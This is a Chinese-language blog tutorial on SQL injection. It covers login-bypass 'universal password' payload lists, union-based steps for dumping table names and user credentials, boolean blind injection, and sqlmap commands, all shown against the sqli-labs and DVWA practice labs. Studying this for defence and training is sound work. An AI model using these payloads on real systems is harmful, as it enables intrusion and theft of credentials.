<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | Qeminco'blog</title><meta name="author" content="Qeminco"><meta name="copyright" content="Qeminco"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入原理原理：目标网站对用户输入的字符没做过滤或者过滤不严谨，导致用户拼接的SQL语句可以在数据库执行。 危害 数据库信息泄露。 数据库信息被篡改。 登录认证被绕过。（万能密码问题） 其他，例如服务器文件被读取或修改，服务器上的程序被执行等。  一旦发生SQL注入都是严重事件（高危）。 万能密码（古老漏洞）如果一个网站使用数据库来存储用户登录信息，并执行如下的SQL语句进行登录尝试：  se">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://qeminco.github.io/2022/12/28/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Qeminco&#39;blog">
<meta property="og:description" content="SQL注入原理原理：目标网站对用户输入的字符没做过滤或者过滤不严谨，导致用户拼接的SQL语句可以在数据库执行。 危害 数据库信息泄露。 数据库信息被篡改。 登录认证被绕过。（万能密码问题） 其他，例如服务器文件被读取或修改，服务器上的程序被执行等。  一旦发生SQL注入都是严重事件（高危）。 万能密码（古老漏洞）如果一个网站使用数据库来存储用户登录信息，并执行如下的SQL语句进行登录尝试：  se">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://qeminco.github.io/img/8.jpg">
<meta property="article:published_time" content="2022-12-27T16:00:00.000Z">
<meta property="article:modified_time" content="2024-06-24T08:15:09.214Z">
<meta property="article:author" content="Qeminco">
<meta property="article:tag" content="web漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qeminco.github.io/img/8.jpg"><link rel="shortcut icon" href="/img/cat.png"><link rel="canonical" href="https://qeminco.github.io/2022/12/28/SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-24 16:15:09'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/kunkun.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/8.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Qeminco'blog"><img class="site-icon" src="/img/cat.png"/><span class="site-name">Qeminco'blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2022-12-27T16:00:00.000Z" title="发表于 2022-12-28 00:00:00">2022-12-28</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>原理：目标网站对用户输入的字符没做过滤或者过滤不严谨，导致用户拼接的SQL语句可以在数据库执行。</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul>
<li>数据库信息泄露。</li>
<li>数据库信息被篡改。</li>
<li>登录认证被绕过。（万能密码问题）</li>
<li>其他，例如服务器文件被读取或修改，服务器上的程序被执行等。</li>
</ul>
<p>一旦发生SQL注入都是严重事件（高危）。</p>
<h1 id="万能密码（古老漏洞）"><a href="#万能密码（古老漏洞）" class="headerlink" title="万能密码（古老漏洞）"></a>万能密码（古老漏洞）</h1><p>如果一个网站使用数据库来存储用户登录信息，并执行如下的SQL语句进行登录尝试：</p>
<p> <code>select * from users where username=&#39;farmsec&#39; and password=&#39;123456&#39;</code> </p>
<p>在这种情况下，攻击者可注入用户名或密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。例如攻击者知道应用程序的username为farmsec，那么他就可以通过提交一下用户名和任意密码，以管理员的身份登录： </p>
<p><code>farmsec&#39; --</code> </p>
<p>应用程序将执行以下查询： </p>
<p><code>select * from users where username=&#39;farmsec&#39; --&#39; and password=&#39;sadfas&#39;</code> </p>
<p>于是乎这个查询完全避开了密码检查。这也引出了经典的万能密码问题。</p>
<p>有些网站的登录页面其背后的逻辑就是上文中的语句。</p>
<p>我们可以在密码部分注入：<code>&#39;or 1=1 --</code></p>
<p>那么整个句子就变成：</p>
<p> <code>select * from users where username=&#39;farmsec&#39; and password=&#39;&#39;or 1=1 --</code></p>
<p>因为1永远等于1，登录验证就会被绕过。</p>
<p>一些常见的万能密码形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin&#x27;-- </span><br><span class="line">admin&#x27; or 4=4-- </span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;-- </span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1-- </span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br></pre></td></tr></table></figure>

<h1 id="一些关键字"><a href="#一些关键字" class="headerlink" title="一些关键字"></a>一些关键字</h1><p>column_name：字段名<br>table_name：表名<br>schema_name：库名<br>information_schema：总库。<br>information_schema.columns：含有所有字段名的表。<br>information_schema.tables：含有所有表名的表。<br>information_schema.schemata：含有所有数据库名的表。<br>table_schema：information_schema.tables表中含有数据库名的那一列。</p>
<h1 id="SQL语句注释符"><a href="#SQL语句注释符" class="headerlink" title="SQL语句注释符"></a>SQL语句注释符</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#单行注释，注意与 url 中的#区分，经常编码为<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">-- 单行注释，在url地址栏写--空格，在页面输入提交的地方写--+</span></span><br><span class="line"><span class="comment">/*多行注释*/</span></span><br></pre></td></tr></table></figure>

<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p><strong>从回显上来分：</strong></p>
<ul>
<li><p>显注，显注是指，当攻击者拼接SQL语句注入时，网站会把SQL语句的执行结果显示在网页上。</p>
</li>
<li><p>盲注，盲注与显注相反，网站不会把SQL语句的执行结果显示出来。</p>
</li>
</ul>
<p><strong>接受请求类型区分：</strong></p>
<ul>
<li>GET 注入，GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制，中文需要 URL 编码。 </li>
<li>POST 注入，POST 请求参数是放在请求 body 里的，长度没有限制。</li>
</ul>
<p><strong>以注入位置区分：</strong></p>
<ul>
<li>cookie注入，参数存在于cookie中，与数据库交互。</li>
<li>User-Agent注入，UA与数据库交互。</li>
<li>一般参数，例如id。</li>
</ul>
<p><img src="/img/20220925102319.png"></p>
<h1 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h1><h2 id="1-判断否存在注入和类型"><a href="#1-判断否存在注入和类型" class="headerlink" title="1 判断否存在注入和类型"></a>1 判断否存在注入和类型</h2><p>原理：我们输入的数据在数据库执行了。那怎么判断是否执行了呢？</p>
<p>先看报错信息：<code>You have an error in your SQL syntax</code> 这句话是mysql数据库经典的语句报错信息。出现这句话基本可以判定我们输入的语句在数据库执行导致了报错，并且判断出数据库类型为mysql。</p>
<p>没有SQL报错信息，就要按下面的方法试验我们注入的语句是否在数据库执行了。</p>
<p><strong>第一种判断方法</strong></p>
<p>id&#x3D;<code>1&#39; and &#39;1&#39;=&#39;1</code>能正常查询，id&#x3D;1’ and ‘1’&#x3D;’2查询不出来，可判断存在注入。</p>
<p>select * from users where id&#x3D;’<code>1&#39; and &#39;1&#39;=&#39;1</code>‘</p>
<p>select * from users where id&#x3D;’<code>1&#39; and 1=1%23</code>‘</p>
<p>select * from users where id&#x3D;’<code>1&#39; and 1=2%23</code>‘</p>
<p><strong>第二种判断方法</strong></p>
<p>id&#x3D;1’ and sleep(5)–+，有时间延迟可判断存在注入。</p>
<h2 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2 判断字段数"></a>2 判断字段数</h2><p>利用 order by 猜解 SQL 查询语句中的字段数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 2%23</span><br></pre></td></tr></table></figure>

<h2 id="3-显示字段信息"><a href="#3-显示字段信息" class="headerlink" title="3 显示字段信息"></a>3 显示字段信息</h2><p>利用联合查询显示上一步两个字段的内容。</p>
<p>id参数为负，不显示union前的查询信息，避免混淆。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2%23</span><br></pre></td></tr></table></figure>

<h2 id="4-查库名"><a href="#4-查库名" class="headerlink" title="4 查库名"></a>4 查库名</h2><p>把1或2替换成查询语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前用户名：</span><br><span class="line">id=-1&#x27; union select 1,user()%23</span><br><span class="line">当前库名：</span><br><span class="line">id=-1&#x27; union select 1,database()%23</span><br><span class="line">数据库版本和当前用户名：</span><br><span class="line">id=-1&#x27; union select version(),user()%23</span><br></pre></td></tr></table></figure>

<h2 id="5-查表名"><a href="#5-查表名" class="headerlink" title="5 查表名"></a>5 查表名</h2><p>查询当前库的所有表名，在第二个查询位建立一个子查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema =database())%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">group_concat() 分组，把括号内字段的值打印在一行，逗号分隔(默认)。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">跟limit差不多。</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select table_name from information_schema.tables where table_schema =database() limit 1,1)%23</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">2</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select table_name from information_schema.tables where table_schema =database() limit 3,1)%23</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">#group_concat()比较方便但是有时候数据显示不全，limit更严谨但是更麻烦。</span><br></pre></td></tr></table></figure>

<h2 id="6-查字段名"><a href="#6-查字段名" class="headerlink" title="6 查字段名"></a>6 查字段名</h2><p>查询users表的字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name =&#x27;users&#x27;)%23</span><br></pre></td></tr></table></figure>

<h2 id="7-查用户名和密码"><a href="#7-查用户名和密码" class="headerlink" title="7 查用户名和密码"></a>7 查用户名和密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select username,password from users%23</span><br></pre></td></tr></table></figure>

<p>当只有一个查询位，但是需要查询多个字段的时候时可以用 group_concat(username,password) ，组拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,(select group_concat(username,password) from users)%23</span><br></pre></td></tr></table></figure>

<h1 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h1><p>例子出自sqli-labs，less-1</p>
<p>按照提示输入合法参数 ?id&#x3D;1</p>
<p>用burpsuite对页面进行抓包 可以发现，http使用的是get请求，同时在URL中也可以看得到参数的传递。</p>
<p>尝试在输入中加入’ 检查是否存在注入点。 发现输入后，页面有提示错误，表示有注入点。</p>
<p>使用sqlmap进行注入测试 使用命令：<code>sqlmap -u &quot;http://192.168.0.180/sqli-labs/Less-1/?id=1&quot; -p id</code></p>
<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>打开靶机sqli-labs，进入less-11页面</p>
<p><img src="/img/20230617152026.png"></p>
<p>先使用dumb用户进行登录。尝试抓包查看数据包 发现这里用的是post请求，同时URL中也不再显示参数。</p>
<p><img src="/img/20230617152324.png"></p>
<p>尝试通过修改数据包的post参数，加入’测试能否注入 发现web报错，说明有注入点。</p>
<p><img src="/img/20230617152457.png"></p>
<p><img src="/img/20230617152534.png"></p>
<p>使用sqlmap进行注入测试 使用sqlmap -r测试。</p>
<p><img src="/img/20230617154053.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r less11.txt --dbms=&quot;mysql&quot; -p uname --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230617160949.png"></p>
<h1 id="1-union-联合注入"><a href="#1-union-联合注入" class="headerlink" title="1 union 联合注入"></a>1 union 联合注入</h1><p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进 行联合查询。两个表的字段要数要相同，不然会出现报错。</p>
<p>dvwa的users表有8个字段，联合users表查询的时候需用8个数字占据8个查询位才不会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824200945.png"></p>
<p>可以看到guestbook是dvwa的另一个表，from guestbook 和 from users 加不加都行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8 from guestbook</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824201424.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8 from users</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824201505.png"></p>
<p>guestbook 表有3个字段，与 guestbook 表联合查询时需用3个数字占据3个查询位才不会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824201938.png"></p>
<p>这些数字可以替换成字段的名称或者函数。</p>
<p><img src="/img/20220824202350.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=1 union select user_id,user,password from users</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824202620.png"></p>
<p>可以把 comment_id 设置为负或为空 null ，只显示我们需要的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=null union select 1,user,password from users</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220824205945.png"></p>
<p>在加上 limit 1 限制只显示一行的时候，若 union 前的查询语句不为负或空，那么union后的信息就不会显示出来。</p>
<p><img src="/img/20220824210358.png"></p>
<p>0x3B是分号，可以作为分隔符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3B,database(),0x3B,version())--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220826220150.png"></p>
<p><img src="/img/20220826220208.png"></p>
<p><img src="/img/20220826221019.png"></p>
<p>也可以用hex值代替表名等。</p>
<p><img src="/img/20220826222132.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x7573657273 limit 1))--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220826222317.png"></p>
<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2 布尔盲注"></a>2 布尔盲注</h1><p>布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面。</p>
<p>以dvwa为例：</p>
<p>输入1，id存在，显示User ID exists in the database.</p>
<p>输入-1，id不存在，显示User ID is MISSING from the database.</p>
<p>像这样可以返回对错的注入点，可以使用布尔盲注构造SQL攻击语句。</p>
<h3 id="判断字符长度"><a href="#判断字符长度" class="headerlink" title="判断字符长度"></a>判断字符长度</h3><p>输入：<code>1&#39; and length(user())&gt;5#</code> 1后面的单引号闭合前面语句。 <code>length()</code>函数会返回括号内的字符串长度，例如<code>length(’abc‘)</code>返回3。函数<code>user()</code>能查询数据库的用户名。<code>length(user())</code>即会查询用户名的长度。 这句话的逻辑很简单，如果当前用户名字的长度大于5，则整个条件为真，数据库就去查询有无ID为1的用户，而我们知道ID为1的用户是存在的。所以应用一定会返回：User ID exists in the database. 如果当前用户名字的长度小于5，应用则会返回User ID is MISSING from the database. 虽然我们不能让应用显示详细信息，但我们可以让它回答：是或否。 我们来看看结果： 应用返回真，于是我们知道了当前用户名的长度大于5。</p>
<p><img src="/img/20230605203845.png"></p>
<p>我们接着输入：<code>1&#39; and length(user())&gt;20#</code>。</p>
<p><img src="/img/20230605203959.png"></p>
<p>应用返回假，于是，我们知道了当前用户名的长度小于20大于5。</p>
<p>我们反复执行这个过程，会越来越缩小范围。最终可以用等于确定。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(user())=14#</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/20230605204059.png"></p>
<h3 id="判断字符的字母"><a href="#判断字符的字母" class="headerlink" title="判断字符的字母"></a>判断字符的字母</h3><p>到此我们确定了用户名长度为14。</p>
<p>开始确定用户名，因为我们只能让web应用回复：是或否。 所以我们只能一个字母一个字母来猜。 输入：<code>1&#39; and substring(user(),1,1)=&#39;a&#39;#</code></p>
<p>这里的substring()函数的作用是提取字符串中的字符.例如:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>) #返回a</span><br><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">3</span>,<span class="number">1</span>) #返回c</span><br><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">3</span>,<span class="number">2</span>) #返回cd</span><br></pre></td></tr></table></figure>

<p>所以注入这个SQL语句的目的就是要取出当前用户名字的第一个字母，用二分法来找出这个字母是什么，接着找第二个字母，然后第三个……</p>
<p>运用二分法，我们继续注入：<code>1&#39; and substring(user(),1,1)&lt;&#39;z&#39;#</code></p>
<p><img src="/img/20230605204706.png"></p>
<p>后续依此逻辑可以得到全部14位的用户名；</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),3,1)=&#x27;</span>o<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),5,1)=&#x27;</span>@<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">6</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;l&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),7,1)=&#x27;</span>o<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),9,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">10</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;l&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),11,1)=&#x27;</span>h<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">12</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;o&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),13,1)=&#x27;</span>s<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">14</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>#</span><br></pre></td></tr></table></figure>

<p>最终得到，用户名为：<code>root@localhost</code></p>
<p>如果想猜测当前数据库，其原理也和上文一样。</p>
<p>首先猜数据库的长度（方法和上方一样），经过注入发现长度为4 <code>1&#39; and length(database())=4#</code></p>
<p>然后，依次注入4位数据库库名的字母。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(database(),1,1)=&#x27;</span>d<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;v&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(database(),3,1)=&#x27;</span>w<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(database(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>#</span><br></pre></td></tr></table></figure>

<p>得到当前数据库库名为<code>dvwa</code></p>
<h3 id="暗月"><a href="#暗月" class="headerlink" title="暗月"></a>暗月</h3><h4 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h4><p><code>if(a,b,c)</code>，此if语句的含义是，如果a为真则返回值为b,否则返回值为c。</p>
<p>布尔型盲注入用到得 SQL 语句 select if(1&#x3D;1,1,0) if()函数在 mysql 是判断，第一 个参数表达式，如果条件成立，会显示 1，否则显示 0。1&#x3D;1 表达式可以换成构造的 SQL 攻击语句。</p>
<p>1’ and if(1&#x3D;1,1,0)–+ 页面返回正常，这个语句实际上是 1’and 1，真 and 真 结果 为真，1 是存在记录的。所以返回正确页面。</p>
<p><img src="/img/20220828094831.png"></p>
<h4 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h4><p>字符串截取，第一个参数是字符串，第二个参数是开始截取的位置，第三个是截取的长度。</p>
<p><img src="/img/20220828101940.png"></p>
<p>可以通过截取database()来猜解数据库名，第一个字符为d，猜解正确返回1，从而输出user_id&#x3D;1的正确结果，否则返回空。</p>
<p><img src="/img/20220828102344.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),1,1)=&#x27;d&#x27;,1,0)#</span><br><span class="line">1&#x27; and substring(database(),1,1)=&#x27;d&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828103043.png"></p>
